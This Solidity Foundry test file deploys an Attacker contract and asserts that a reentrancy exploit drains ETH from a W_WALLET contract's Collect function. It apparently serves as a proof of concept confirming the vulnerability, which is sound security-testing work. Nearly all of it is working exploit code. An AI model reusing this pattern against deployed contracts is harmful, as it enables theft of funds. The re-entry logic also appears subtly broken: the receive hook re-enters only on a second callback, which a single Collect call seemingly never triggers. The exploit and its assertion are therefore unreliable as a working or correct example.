
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {StdStorage, stdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/Log.sol";

contract TestReentrancyW_WALLET is Test {
    using stdStorage for StdStorage;
    
    W_WALLET public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new W_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);
        
        // Set attacker's balance and unlock time in W_WALLET
        address attackerAddress = address(_attacker);
        bytes32 balanceSlot = keccak256(abi.encode(attackerAddress, uint256(1)));
        bytes32 unlockTimeSlot = keccak256(abi.encode(attackerAddress, uint256(2)));
        
        // Set balance to 2 * attackVal to meet MinSum and allow withdrawal
        vm.store(address(_contractUnderTest), balanceSlot, bytes32(uint256(attackVal * 2)));
        
        // Set unlock time to past (block.timestamp - 1)
        vm.store(address(_contractUnderTest), unlockTimeSlot, bytes32(uint256(block.timestamp - 1)));
        
        // Fund the victim contract with enough ETH
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the attacker with ETH for gas
        vm.deal(attackerAddress, 1 ether);
        
        // Fund the test contract for setup
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        attackAmount = val;
        
        // Deposit to set up initial state through the contract's Put function
        victim.Put{value: msg.value}(block.timestamp - 1);
    }

    function attack(uint256 val) public {
        attackAmount = val;
        initialSnapshot = address(victim).balance;
        
        // Call the vulnerable Collect function
        victim.Collect(val);
        
        // Check if exploit succeeded
        uint256 finalBalance = address(victim).balance;
        uint256 expectedWithdrawn = val * 2; // Should have withdrawn twice due to reentrancy
        
        if (initialSnapshot - finalBalance >= expectedWithdrawn) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount == 2) {
                // Re-enter during the first call
                victim.Collect(attackAmount);
            }
        }
    }
}
